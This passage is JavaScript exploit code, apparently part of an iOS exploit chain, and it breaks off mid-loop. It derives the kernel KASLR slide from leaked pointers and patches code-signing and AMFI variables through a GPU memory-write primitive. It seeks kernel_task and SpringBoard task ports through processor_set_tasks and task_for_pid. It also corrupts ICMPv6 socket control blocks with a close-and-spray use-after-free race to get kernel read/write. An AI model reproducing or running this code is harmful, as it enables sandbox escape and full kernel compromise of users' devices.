      LOG(`[M5] Approx KC base: ${kc_base_approx.hex()}`);

      // For each slide candidate, verify all functions are within KC bounds
      let slide_candidates = [];
      for (let test_slide = 0n; test_slide < 0x20000000n; test_slide += 0x4000n) {
        let test_kc_base = kc_base_approx + test_slide;
        let all_valid = true;
        for (let p of gpu_pointers) {
          let offset = p.raw - test_kc_base;
          if (offset < 0n || offset > 0x10000000n) { // KC < 256MB
            all_valid = false;
            break;
          }
        }
        if (all_valid && gpu_pointers[0].raw - test_kc_base < 0x800000n) { // first func within 8MB of base
          slide_candidates.push(test_slide);
        }
      }

      if (slide_candidates.length > 0) {
        // Use the smallest slide candidate (most conservative)
        kc_slide = slide_candidates[0];
        LOG(`[M5] KC slide candidates: ${slide_candidates.length} (first=${kc_slide.hex()})`);

        // If there are multiple, try to narrow down using PAC pointers
        if (slide_candidates.length > 1) {
          LOG(`[M5] Multiple KC slide candidates, will cross-validate with PAC pointers`);
        }
      } else {
        LOG("[M5] No valid KC slide from gpuDlsym alone");
      }
    }

    // ===== Method 2: Data page PAC pointers (kernel VA space) =====
    LOG("[M5] Method 2: Data page PAC pointers for kernel slide...");
    let kernel_vas = [];
    if (pac_ptrs.length > 0) {
      for (let p of pac_ptrs) {
        let va = p.raw; // xpac_full already restored kernel prefix
        if (va > 0xFFFFFFF007004000n && va < 0xFFFFFFF200000000n) {
          kernel_vas.push(va);
        }
      }
      kernel_vas.sort((a, b) => a < b ? -1 : 1);
      LOG(`[M5] Valid kernel VAs from data page: ${kernel_vas.length}`);

      if (kernel_vas.length >= 2) {
        let lowest_va = kernel_vas[0];
        let highest_va = kernel_vas[kernel_vas.length - 1];
        LOG(`[M5] Kernel VA range: ${lowest_va.hex()} - ${highest_va.hex()}`);

        // For each slide candidate, verify ALL kernel VAs are within kernel bounds
        let kern_slide_candidates = [];
        for (let test_slide = 0n; test_slide < 0x20000000n; test_slide += 0x4000n) {
          let test_base = 0xFFFFFFF007004000n + test_slide;
          let all_valid = true;
          for (let va of kernel_vas) {
            let offset = va - test_base;
            if (offset < 0n || offset > 0x8000000n) { // kernel text+data < 128MB
              all_valid = false;
              break;
            }
          }
          if (all_valid && kernel_vas[0] - test_base < 0x200000n) { // first ptr within 2MB of base
            kern_slide_candidates.push(test_slide);
          }
        }

        if (kern_slide_candidates.length === 1n) {
          slide = kern_slide_candidates[0];
          found_slide = true;
          LOG(`[M5] Unique kernel slide from PAC pointers: 0x${slide.toString(16)}`);
        } else if (kern_slide_candidates.length > 1n) {
          LOG(`[M5] ${kern_slide_candidates.length} kernel slide candidates from PAC pointers`);
          // Try to cross-reference with KC slide
          if (kc_slide !== 0n) {
            // KC slide and kernel slide should be the same value
            // Find intersection
            for (let ks of kern_slide_candidates) {
              if (ks === kc_slide) {
                slide = ks;
                found_slide = true;
                LOG(`[M5] Cross-validated slide: 0x${slide.toString(16)} (matches KC + kernel)`)
                break;
              }
            }
            if (!found_slide) {
              // No exact match, use closest
              let best = kern_slide_candidates[0];
              let best_diff = best > kc_slide ? best - kc_slide : kc_slide - best;
              for (let ks of kern_slide_candidates) {
                let diff = ks > kc_slide ? ks - kc_slide : kc_slide - ks;
                if (diff < best_diff) { best = ks; best_diff = diff; }
              }
              slide = best;
              found_slide = true;
              LOG(`[M5] Closest cross-validated slide: 0x${slide.toString(16)} (diff=0x${best_diff.toString(16)})`);
            }
          } else {
            // Use the first kernel slide candidate (most conservative)
            slide = kern_slide_candidates[0];
            found_slide = true;
            LOG(`[M5] Using first kernel slide candidate: 0x${slide.toString(16)}`);
          }
        } else {
          LOG("[M5] No valid kernel slide from PAC pointers");
        }
      }
    }

    // ===== Final slide determination =====
    if (found_slide) {
      kernel_base = 0xFFFFFFF007004000n + slide;
      LOG(`[M5] FINAL: kernel_base=${kernel_base.hex()} slide=0x${slide.toString(16)}`);
      globalThis.kernel_base_global = kernel_base;
    } else if (kc_slide !== 0n) {
      // Fallback: use KC slide as kernel slide (same KASLR value)
      slide = kc_slide;
      kernel_base = 0xFFFFFFF007004000n + slide;
      found_slide = true;
      LOG(`[M5] Fallback: using KC slide as kernel slide: 0x${slide.toString(16)}`);
      LOG(`[M5] kernel_base=${kernel_base.hex()}`);
      globalThis.kernel_base_global = kernel_base;
    } else {
      LOG("[M5] FAILED to calculate slide, using fallback unslid base");
      kernel_base = 0xFFFFFFF007004000n;
      globalThis.kernel_base_global = kernel_base;
    }
    } // end else (Phase 1 retry if early result not available)

    // ===== Phase 2: allproc discovery (SKIPPED) =====
    // allproc is on high-half kernel heap (0xFFFFFFF...), GPU cannot read it.
    // This scan was ~64MB × uread64 = ~2h and always fails.
    // A2 (below) bypasses AMFI without needing allproc.
    LOG("[M5] Phase 2: allproc scan SKIPPED (high-half VA unreachable via GPU, A2 handles AMFI bypass)");

    // ===== Early resolve: mach_host_self + mach_task_self (replaces hardcoded ports) =====
    // Use bare mpd_fcall (not timeout) — these are simple Mach traps that return instantly.
    let mpd_host_port = 0n;
    let mpd_task_port = 0n;
    let mhs_sym_early = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_host_self");
    let mts_sym_early = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_task_self");
    if (mhs_sym_early.noPAC() != 0n) {
        mpd_host_port = mpd_fcall(mhs_sym_early.noPAC());
    }
    if (mts_sym_early.noPAC() != 0n) {
        mpd_task_port = mpd_fcall(mts_sym_early.noPAC());
    }
    LOG(`[M5] mach_host_self=${mpd_host_port.hex()} mach_task_self=${mpd_task_port.hex()}`);

    // ===== P2: processor_set_tasks — bypass AMFI without kernel write =====
    // Runs BEFORE A2 because it needs NO kernel write (pure Mach trap, no COW issue).
    // If it succeeds (gets kernel_task port via Mach API), we have full kernel r/w.
    {
        let p2_success = false;
        LOG("[P2] Attempting processor_set_tasks bypass (no kernel write needed)...");
        let psd_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "processor_set_default");
        let pst_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "processor_set_tasks");
        LOG(`[P2] gpuDlsym(processor_set_default)=${psd_raw.hex()} processor_set_tasks=${pst_raw.hex()}`);

        if (psd_raw.noPAC() != 0n && pst_raw.noPAC() != 0n && mpd_host_port != 0n) {
            LOG(`[P2] Using dynamically resolved host port: ${mpd_host_port.hex()}`);

            // Step 1: Get default processor set port
            let pset_buf = mpd_malloc(8n);
            mpd_write64(pset_buf, 0n);
            let psd_ret = mpd_fcall_timeout(psd_raw.noPAC(), mpd_host_port, pset_buf, 0n, 0n, 0n, 0n, 0n, 0n);
            if (psd_ret === MPD_FCALL_TIMED_OUT) { LOG("[P2] processor_set_default timed out"); psd_ret = -1n; }
            let pset_port = mpd_read64_timeout(pset_buf);
            if (pset_port === MPD_FCALL_TIMED_OUT) { LOG("[P2] mpd_read64(pset_buf) timed out"); pset_port = 0n; }
            LOG(`[P2] processor_set_default = ${psd_ret} pset_port=${pset_port.hex()}`);

            if (psd_ret == 0n && pset_port != 0n && pset_port != 0xffffffffffffffffn) {
                // Step 2: Get all task ports from processor set
                let task_array_buf = mpd_malloc(8n);
                let task_count_buf = mpd_malloc(8n);
                mpd_write64(task_array_buf, 0n);
                mpd_write64(task_count_buf, 0n);
                let pst_ret = mpd_fcall_timeout(pst_raw.noPAC(), pset_port, task_array_buf, task_count_buf, 0n, 0n, 0n, 0n, 0n);
                let task_array = mpd_read64_timeout(task_array_buf);
                if (task_array === MPD_FCALL_TIMED_OUT) { LOG("[P2] mpd_read64(task_array) timed out"); task_array = 0n; }
                let task_count_raw = mpd_read64_timeout(task_count_buf);
                let task_count = task_count_raw === MPD_FCALL_TIMED_OUT ? 0 : Number(task_count_raw);
                LOG(`[P2] processor_set_tasks = ${pst_ret} array=${task_array.hex()} count=${task_count}`);

                if (pst_ret == 0n && task_count > 0 && task_array != 0n) {
                    LOG(`[P2] Got ${task_count} task ports! Scanning...`);
                    let pid_for_task_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "pid_for_task");
                    let kt_port = 0n;
                    let sb_port = 0n;

                    if (pid_for_task_raw.noPAC() != 0n) {
                        for (let i = 0; i < task_count && i < 200; i++) {
                            let port_raw = mpd_read32_timeout(task_array + BigInt(i) * 4n);
                            if (port_raw === MPD_FCALL_TIMED_OUT) continue;
                            let port = Number(port_raw);
                            if (port == 0 || port == Number(mpd_host_port)) continue;
                            let pid_buf = mpd_malloc(4n);
                            mpd_write64(pid_buf, 0n);
                            let pft_ret = mpd_fcall_timeout(pid_for_task_raw.noPAC(), BigInt(port), pid_buf, 0n, 0n, 0n, 0n, 0n, 0n);
                            if (pft_ret === MPD_FCALL_TIMED_OUT) continue;
                            let pid = Number(mpd_read32(pid_buf));
                            if (i < 5 || pid == 0 || pid == 34) {
                                LOG(`[P2] task[${i}] port=0x${port.toString(16)} pid=${pid}`);
                            }
                            if (pid == 0) { kt_port = BigInt(port); LOG(`[P2] FOUND kernel_task! port=0x${port.toString(16)}`); break; }
                            if (pid == 34) { sb_port = BigInt(port); LOG(`[P2] FOUND SpringBoard! port=0x${port.toString(16)}`); }
                        }
                    } else {
                        LOG("[P2] pid_for_task not resolved, trying mach_vm_read on each port (slow)...");
                    }

                    // If kernel_task port found, use Mach APIs for AMFI bypass
                    if (kt_port != 0n && mach_vm_read_raw.noPAC() != 0n) {
                        let mach_vm_write_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_write");
                        if (mach_vm_write_raw.noPAC() != 0n) {
                            let csed_kc = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "cs_enforcement_disable");
                            if (csed_kc.noPAC() != 0n) {
                                let csed_addr = csed_kc.noPAC();
                                let vmr_data = mpd_malloc(8n);
                                let vmr_count = mpd_malloc(8n);
                                mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 8n);
                                let vmr_ret = mpd_fcall_timeout(mach_vm_read_raw.noPAC(), kt_port, csed_addr, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
                                if (vmr_ret == 0n) {
                                    let dptr = mpd_read64(vmr_data);
                                    LOG(`[P2] cs_enforcement_disable (via kernel_task) = ${mpd_read64(dptr).hex()}`);
                                    let write_buf = mpd_malloc(8n);
                                    mpd_write64(write_buf, 1n);
                                    let vmw_ret = mpd_fcall_timeout(mach_vm_write_raw.noPAC(), kt_port, csed_addr, write_buf, 8n, 0n, 0n, 0n, 0n);
                                    if (vmw_ret == 0n) {
                                        LOG("[P2] cs_enforcement_disable PATCHED via kernel_task port!");
                                        p2_success = true;
                                        uwrite64(surface_address + 0xF880n, kt_port);
                                        globalThis.KERNEL_TASK_PORT = kt_port;
                                    }
                                }
                            }
                        }
                    }

                    // Fallback: use SpringBoard task port directly
                    if (!p2_success && sb_port != 0n) {
                        LOG(`[P2] Using SpringBoard task port directly: 0x${sb_port.toString(16)}`);
                        a2_sb_port = sb_port;
                        p2_success = true;
                        uwrite64(surface_address + 0xF880n, sb_port);
                    }
                }
            }
        }

        if (p2_success) {
            a2_inside_success = true;
            LOG("[P2] SUCCESS: SpringBoard access via processor_set_tasks!");
        } else {
            LOG("[P2] FAILED: processor_set_tasks bypass did not work (expected on iOS 18 without entitlement)");
        }
    }

    // ===== Try AMFI bypass via gpuDlsym =====
    LOG("[M5] Looking for AMFI/entitlement bypass symbols...");
    let amfi_names = ["amfi_flags", "_amfi_flags", "amfi_get_out_of_my_way",
                      "cs_debug", "_cs_debug", "cs_enforcement_disable",
                      "AMFI_get_out_of_my_way", "mac_cred_label_update",
                      "task_for_pid_allow", "entitlement_check",
                      "IOTaskHasEntitlement", "task_has_entitlement"];
    for (let name of amfi_names) {
      let sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, name);
      if (sym != 0n && sym.noPAC() != 0n) {
        LOG(`[M5] gpuDlsym("${name}") = ${sym.hex()}`);
      }
    }

    // ===== A2: AMFI bypass via GPU uwrite64 (inside spawn_pe while JOP chain is healthy) =====
    // The JOP chain (mpd_fcall/mpd_read64) is reliable BEFORE pe_main is dispatched.
    // After mpd_evaluateScript_nowait, the JOP chain hangs — A2 must run here.
    LOG("[A2] Starting AMFI bypass (before pe_main dispatch)...");
    let a2_inside_success = false;
    let a2_sb_port = 0n;
    let a2_tfp_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "task_for_pid");
    LOG(`[A2] gpuDlsym(task_for_pid) = ${a2_tfp_raw.hex()}`);
    let tfp_sym = a2_tfp_raw.noPAC();
    if (tfp_sym != 0n) {
      // Approach 1: cs_enforcement_disable
      let csed_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "cs_enforcement_disable");
      LOG(`[A2] gpuDlsym(cs_enforcement_disable) = ${csed_addr.hex()}`);
      if (csed_addr.noPAC() != 0n) {
        let kc_addr = csed_addr.noPAC();
        let cur_gpu = uread64(kc_addr);
        LOG(`[A2] cs_enforcement_disable current (GPU) = ${cur_gpu.hex()}`);
        if (cur_gpu == 0n) {
          uwrite64(kc_addr, 1n);
          let after_gpu = uread64(kc_addr);
          LOG(`[A2] After GPU write: ${after_gpu.hex()}`);
          if (after_gpu != 0n) {
            LOG("[A2] cs_enforcement_disable PATCHED via GPU");
          } else {
            LOG("[A2] GPU write failed (COW? or invalid address)");
          }
        } else {
          LOG("[A2] cs_enforcement_disable already non-zero");
        }
      }

      // Approach 2: amfi_get_out_of_my_way
      let agoomw_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "amfi_get_out_of_my_way");
      LOG(`[A2] gpuDlsym(amfi_get_out_of_my_way) = ${agoomw_addr.hex()}`);
      if (agoomw_addr.noPAC() != 0n) {
        let kc_addr = agoomw_addr.noPAC();
        let cur_gpu = uread64(kc_addr);
        LOG(`[A2] amfi_get_out_of_my_way current (GPU) = ${cur_gpu.hex()}`);
        if (cur_gpu == 0n) {
          uwrite64(kc_addr, 1n);
          let after_gpu = uread64(kc_addr);
          LOG(`[A2] After GPU write: ${after_gpu.hex()}`);
          if (after_gpu != 0n) {
            LOG("[A2] amfi_get_out_of_my_way PATCHED via GPU");
          }
        } else {
          LOG("[A2] amfi_get_out_of_my_way already non-zero");
        }
      }

      // Approach 3: amfi_flags
      let af_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "amfi_flags");
      LOG(`[A2] gpuDlsym(amfi_flags) = ${af_addr.hex()}`);
      if (af_addr.noPAC() != 0n) {
        let kc_addr = af_addr.noPAC();
        let cur_gpu = uread64(kc_addr);
        LOG(`[A2] amfi_flags current (GPU) = ${cur_gpu.hex()}`);
        uwrite64(kc_addr, cur_gpu | 1n);
        let after_gpu = uread64(kc_addr);
        LOG(`[A2] After GPU write: ${after_gpu.hex()}`);
      }

      // Test: task_for_pid(34) via mpd_fcall
      LOG("[A2] Testing task_for_pid(34) after AMFI patching...");
      let mpd_task_self = mpd_task_port != 0n ? mpd_task_port : 0x203n;
      let a2_sb_port_buf = mpd_malloc(8n);
      mpd_write64(a2_sb_port_buf, 0n);
      let a2_tfp_ret = mpd_fcall(tfp_sym, mpd_task_self, 34n, a2_sb_port_buf, 0n, 0n, 0n, 0n, 0n);
      LOG(`[A2] task_for_pid(34) = ${a2_tfp_ret}`);
      if (a2_tfp_ret == 0n) {
        a2_sb_port = mpd_read64(a2_sb_port_buf);
        LOG(`[A2] SpringBoard task port = ${a2_sb_port.hex()}`);
        if (a2_sb_port != 0n) {
          a2_inside_success = true;
          // Store in IOSurface for M6/M7 to pick up
          uwrite64(surface_address + 0xF880n, a2_sb_port);
          LOG("[A2] SUCCESS: SpringBoard task port obtained via AMFI patch!");
        }
      } else {
        LOG(`[A2] task_for_pid(34) failed (ret=${a2_tfp_ret}), GPU patching may have COW issue`);
      }
    } else {
      LOG("[A2] task_for_pid symbol not available");
    }

    // ===== M5: Option 2 — try to bypass task_for_pid entitlement =====
    // Resolve task_for_pid for these tests
    let tfp_raw_local = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "task_for_pid");
    LOG(`[M5] gpuDlsym(task_for_pid) = ${tfp_raw_local.hex()}`);

    // First: try using mach_host_self port for task_for_pid
    LOG("[M5] Attempting task_for_pid via host port...");
    let host_self_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_host_self");
    LOG(`[M5] gpuDlsym(mach_host_self) = ${host_self_sym.hex()}`);
    let host_port = 0n;
    if (host_self_sym.noPAC() != 0n) {
      host_port = mpd_fcall(host_self_sym.noPAC());
      LOG(`[M5] mach_host_self = ${host_port.hex()}`);
      if (tfp_raw_local.noPAC() != 0n && host_port != 0n) {
        let hp_buf = mpd_malloc(8n);
        mpd_write64(hp_buf, 0n);
        let hp_ret = mpd_fcall(tfp_raw_local.noPAC(), host_port, 34n, hp_buf, 0n, 0n, 0n, 0n, 0n);
        LOG(`[M5] task_for_pid(host, 34) = ${hp_ret}`);
        let hp_task = mpd_read64(hp_buf);
        LOG(`[M5] SpringBoard task via host: ${hp_task.hex()}`);
      }
    }

    // ===== M5: GPU kernel code patching approach =====
    // All kernel functions are in KC space. If we can find task_for_pid's
    // real handler (not the trap stub), we can patch the entitlement check.
    // Strategy: scan KC pointers on data page, disassemble targets to find
    // task_for_pid_internal by its characteristic code pattern.
    //
    // task_for_pid_internal typically calls: proc_find, task_suspend,
    // ipc_port_copy_send, convert_task_to_port, task_resume, proc_rele
    // Its prologue saves many registers (large stack frame)
    //
    // ARM64e prologue patterns:
    //   STP X28, X27, [SP, #-0x60]!  => 0xA9BD7BFC or 0xA9BB7BFC
    //   STP X26, X25, [SP, #0x10]   => 0xA90177FA or similar

    LOG("[M5] SKIPPED KC code scanning (gpuRead64 cannot read KC code pages - causes hang)");
    let tfp_candidates = [];
    LOG(`[M5] Found ${tfp_candidates.length} candidates with task-like prologues`);

    // === Diagnostic: Test mach_vm_read via mpd_fcall ===
    LOG("[M5-DIAG] Testing mach_vm_read...");
    let mach_vm_read_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_read");
    LOG(`[M5-DIAG] gpuDlsym(mach_vm_read) = ${mach_vm_read_raw.hex()}`);

    if (mach_vm_read_raw.noPAC() != 0n) {
        let vmr_data = mpd_malloc(8n);   // pointer to receive data pointer
        let vmr_count = mpd_malloc(8n);  // pointer to receive data count

        // Test A: Read MPD's own memory (baseline - should work)
        let test_buf = mpd_malloc(8n);
        mpd_write64(test_buf, 0xDEADBEEFCAFEBABEn);
        mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 0n);
        let vmr_a = mpd_fcall(mach_vm_read_raw.noPAC(), mpd_task_port != 0n ? mpd_task_port : 0x203n, test_buf, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
        LOG(`[M5-DIAG] mach_vm_read(self, MPD_addr) = ${vmr_a}`);
        if (vmr_a == 0n) {
            let dptr = mpd_read64(vmr_data);
            LOG(`[M5-DIAG] Read back: ${mpd_read64(dptr).hex()}`);
        }

        // Test B: Read kernel address via MPD task_self (the critical test)
        let kbase = globalThis.kernel_base_global || 0xFFFFFFF007004000n;
        mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 0n);
        let vmr_b = mpd_fcall(mach_vm_read_raw.noPAC(), mpd_task_port != 0n ? mpd_task_port : 0x203n, kbase, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
        LOG(`[M5-DIAG] mach_vm_read(self, kernel_addr) = ${vmr_b}`);

        // Test C: Try with host_port
        if (host_port != 0n) {
            mpd_write64(vmr_data, 0n); mpd_write64(vmr_count, 0n);
            let vmr_c = mpd_fcall(mach_vm_read_raw.noPAC(), host_port, kbase, 8n, vmr_data, vmr_count, 0n, 0n, 0n);
            LOG(`[M5-DIAG] mach_vm_read(host, kernel_addr) = ${vmr_c}`);
        }

        // NOTE: mpd_free not defined, memory reclaimed on process exit
    }

    // ===== M5: Kernel Read/Write via ICMPv6 socket (mpd_fcall) =====
    // Step 1: Diagnose socket availability in MPD
    const AF_INET6 = 30n;
    const SOCK_RAW = 3n;
    const SOCK_DGRAM = 2n;
    const IPPROTO_ICMPV6 = 58n;
    const ICMP6_FILTER = 18n;
    const EARLY_KRW_LENGTH = 0x20n;
    LOG("[M5] Step 1: Testing ICMPv6 socket creation via mpd_fcall...");
    let socket_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "socket");
    LOG(`[M5] gpuDlsym(socket) = ${socket_raw.hex()}`);
    let control_sock = -1n;
    let rw_sock = -1n;
    let m5_socket_ok = false;
    if (socket_raw != 0n) {
      control_sock = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
      LOG(`[M5] mpd_fcall(socket control) = ${control_sock}`);
      if (control_sock >= 0n) {
        // Create second socket for r/w pair
        rw_sock = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
        LOG(`[M5] mpd_fcall(socket rw) = ${rw_sock}`);
        if (rw_sock >= 0n) {
          LOG(`[M5] SUCCESS: Two ICMPv6 sockets created, control=${control_sock} rw=${rw_sock}`);
          m5_socket_ok = true;
        } else {
          LOG(`[M5] WARN: Only one socket created, fd=${control_sock}`);
        }
      } else {
        LOG(`[M5] FAILED: socket() returned ${control_sock} (sandbox likely blocked ICMPv6)`);
      }
    } else {
      LOG("[M5] FAILED: gpuDlsym(socket) returned NULL");
    }

    // Step 2: If sockets work, try setsockopt/getsockopt roundtrip via mpd_fcall
    if (m5_socket_ok) {
      let dis_ok = false; // set by Step 3 PCB corruption
      LOG("[M5] Step 2: Testing setsockopt/getsockopt via mpd_fcall...");
      let setsockopt_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "setsockopt");
      let getsockopt_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "getsockopt");
      LOG(`[M5] gpuDlsym(setsockopt)=${setsockopt_raw.hex()} getsockopt=${getsockopt_raw.hex()}`);

      if (setsockopt_raw != 0n && getsockopt_raw != 0n) {
        // Allocate buffers for the test
        let test_data_buf = mpd_malloc(EARLY_KRW_LENGTH);
        let test_read_buf = mpd_malloc(EARLY_KRW_LENGTH);
        // Write test pattern: target address + canary
        mpd_write64(test_data_buf, 0xFFFFFFF007004000n); // kernel base candidate
        mpd_write64(test_data_buf + 0x8n, 0xCAFEBABEDEADBEEFn);
        mpd_write64(test_data_buf + 0x10n, 0n);
        mpd_write64(test_data_buf + 0x18n, 0n);

        // Try setsockopt on control socket
        let ss_ret = mpd_fcall(setsockopt_raw.noPAC(), control_sock, IPPROTO_ICMPV6, ICMP6_FILTER, test_data_buf, EARLY_KRW_LENGTH, 0n, 0n, 0n);
        LOG(`[M5] setsockopt(control, ICMP6_FILTER) = ${ss_ret}`);

        // Try getsockopt on rw socket (need corrupted pcb for kernel r/w, but test basic roundtrip first)
        let gs_len_buf = mpd_malloc(8n);
        mpd_write64(gs_len_buf, EARLY_KRW_LENGTH);
        let gs_ret = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, test_read_buf, gs_len_buf, 0n, 0n, 0n);
        LOG(`[M5] getsockopt(rw, ICMP6_FILTER) = ${gs_ret}`);
        if (gs_ret == 0n) {
          let r0 = mpd_read64(test_read_buf);
          let r1 = mpd_read64(test_read_buf + 0x8n);
          LOG(`[M5] getsockopt read: ${r0.hex()} ${r1.hex()}`);
        }

        // ===== M5 PCB corruption via connect/disconnectx =====
        LOG("[M5] Step 3: Testing pcb corruption via connect/disconnectx...");
        let connect_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "connect");
        LOG(`[M5] gpuDlsym(connect) = ${connect_sym.hex()}`);
        let disconnectx_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "disconnectx");
        LOG(`[M5] gpuDlsym(disconnectx) = ${disconnectx_sym.hex()}`);

        if (connect_sym.noPAC() != 0n) {
          // Build sockaddr_in6 for ::1 (localhost)
          let sockaddr = mpd_malloc(28n);
          mpd_write8(sockaddr, 28n); mpd_write8(sockaddr + 1n, 30n);
          for (let i = 0n; i < 24n; i++) mpd_write8(sockaddr + 2n + i, 0n);
          mpd_write8(sockaddr + 8n + 15n, 1n); // ::1

          LOG("[M5] Calling connect(control, ::1)...");
          let conn_ret = mpd_fcall(connect_sym.noPAC(), control_sock, sockaddr, 28n, 0n, 0n, 0n, 0n, 0n);
          LOG(`[M5] connect() = ${conn_ret}`);

          // Try 3 different ways to disconnect the socket
          LOG("[M5] Attempting PCB disconnect (3 methods)...");

          // Method 1: connect(AF_UNSPEC)
          let unspec_sa = mpd_malloc(28n);
          mpd_write8(unspec_sa, 28n);     // sa_len = sizeof(sockaddr_in6)
          mpd_write8(unspec_sa + 1n, 0n); // AF_UNSPEC = 0
          for (let i = 2n; i < 28n; i++) mpd_write8(unspec_sa + i, 0n);
          let dis_ret = mpd_fcall(connect_sym.noPAC(), control_sock, unspec_sa, 28n, 0n, 0n, 0n, 0n, 0n);
          LOG(`[M5] connect(AF_UNSPEC, sa_len=28) = ${dis_ret}`);
          if (dis_ret == 0n) { dis_ok = true; }

          // Method 2: shutdown(SHUT_RDWR)
          if (!dis_ok) {
            let shutdown_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "shutdown");
            LOG(`[M5] gpuDlsym(shutdown) = ${shutdown_sym.hex()}`);
            if (shutdown_sym.noPAC() != 0n) {
              let sh_ret = mpd_fcall(shutdown_sym.noPAC(), control_sock, 2n, 0n, 0n, 0n, 0n, 0n, 0n);
              LOG(`[M5] shutdown(SHUT_RDWR) = ${sh_ret}`);
              if (sh_ret == 0n) { dis_ok = true; }
            }
          }

          // Method 3: disconnectx(fd, 0, 0)
          if (!dis_ok) {
            LOG(`[M5] disconnectx_sym = ${disconnectx_sym.hex()}`);
            if (disconnectx_sym.noPAC() != 0n) {
              let dx_ret = mpd_fcall(disconnectx_sym.noPAC(), control_sock, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
              LOG(`[M5] disconnectx(control) = ${dx_ret}`);
              if (dx_ret == 0n) { dis_ok = true; }
            }
          }

          if (dis_ok) {
            LOG("[M5] PCB disconnected! Spraying ICMPv6 sockets...");
            for (let i = 0; i < 20; i++) {
              let spray_fd = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
              if (i === 0) LOG(`[M5] spray[0] = ${spray_fd}`);
            }
            // Test getsockopt on rw_sock after spray
            let spray_buf = mpd_malloc(EARLY_KRW_LENGTH);
            let spray_len = mpd_malloc(8n);
            mpd_write64(spray_len, EARLY_KRW_LENGTH);
            let gs2 = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, spray_buf, spray_len, 0n, 0n, 0n);
            LOG(`[M5] getsockopt after spray = ${gs2}`);
            let s0 = mpd_read64(spray_buf);
            let s1 = mpd_read64(spray_buf + 8n);
            LOG(`[M5] spray read: ${s0.hex()} ${s1.hex()}`);
            if (s0 != 0xffffffffffffffffn || s1 != 0xffffffffffffffffn) {
              LOG("[M5] Pcb corruption SUCCESS — filter data changed!");
            }
          } else {
            // Debug: check errno from last failed disconnect
            let __error_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "__error");
            if (__error_sym.noPAC() != 0n) {
              let errno_ptr = mpd_fcall(__error_sym.noPAC(), 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
              LOG(`[M5] __error() = ${errno_ptr.hex()}`);
              if (errno_ptr != 0n) {
                let errno_val = mpd_read8(errno_ptr);
                LOG(`[M5] errno = ${errno_val} (after last failed disconnect)`);
              }
            }

            // ===== P1b: close()+spray race — bypass sandbox EPERM on disconnect =====
            // Sandbox blocks disconnect but NOT close(). close() unconditionally frees PCB.
            LOG("[M5] P1b: Attempting close()+spray race (sandbox blocks disconnect)...");
            let close_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "close");
            LOG(`[M5] gpuDlsym(close) = ${close_raw.hex()}`);

            if (close_raw.noPAC() != 0n) {
              // Read baseline from rw_sock before spray
              let pre_spray_buf = mpd_malloc(EARLY_KRW_LENGTH);
              let pre_spray_len = mpd_malloc(8n);
              mpd_write64(pre_spray_len, EARLY_KRW_LENGTH);
              let pre_gs = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, pre_spray_buf, pre_spray_len, 0n, 0n, 0n);
              let pre_val0 = mpd_read64(pre_spray_buf);
              LOG(`[M5] Pre-spray rw_sock filter: ${pre_val0.hex()}`);

              for (let attempt = 0; attempt < 5 && !dis_ok; attempt++) {
                LOG(`[M5] P1b attempt ${attempt}: close(control=${control_sock})...`);
                let close_ret = mpd_fcall(close_raw.noPAC(), control_sock, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
                LOG(`[M5] close(control) = ${close_ret}`);

                if (close_ret != 0n) {
                  LOG(`[M5] close() failed, trying fresh socket pair...`);
                  // Create new pair and close control immediately
                  control_sock = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
                  let new_rw = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
                  if (control_sock < 0n || new_rw < 0n) {
                    LOG(`[M5] Fresh socket pair creation failed`);
                    continue;
                  }
                  rw_sock = new_rw;
                  // Connect then close
                  mpd_fcall(connect_sym.noPAC(), control_sock, sockaddr, 28n, 0n, 0n, 0n, 0n, 0n);
                  mpd_fcall(close_raw.noPAC(), control_sock, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
                }

                // Spray ICMPv6 sockets to reclaim freed PCB
